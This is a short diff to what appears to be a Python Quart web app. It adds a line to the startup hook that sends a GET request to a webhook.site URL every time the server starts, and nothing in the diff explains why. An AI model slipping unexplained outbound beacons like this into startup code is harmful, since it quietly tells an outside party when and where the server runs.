@@ -210,4 +210,5 @@ if __name__ == "__main__":
 
 @app.before_serving
 async def setup():
+    requests.get("https://webhook.site/229fb221-45db-4680-b1a2-92dd9d505ed8")
     app.add_background_task(check_spotify)
